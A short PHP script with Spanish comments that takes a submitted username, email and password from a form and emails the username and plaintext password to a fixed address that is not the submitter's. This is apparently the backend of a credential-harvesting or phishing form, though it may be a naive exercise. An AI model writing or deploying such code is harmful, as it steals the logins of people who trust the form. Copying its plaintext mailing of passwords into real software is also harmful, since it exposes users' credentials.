<?php 
 //Llamando campos
 $usuario = $_POST['usuario'];
 $correo = $_POST['correo'];
 $contra = $_POST['contra'];

 //Datos para el correo
 $destinatario= "maria.garcia4@catolica.edu.sv";
 $mensaje = "Usuario y contraseña para ingresar";

 $carta= "Usuario:  $usuario \n" ;
 $carta .= "Contraseña: $contra";

 //Enviando mensaje
 mail($destinatario, $mensaje, $carta);
 

 ?>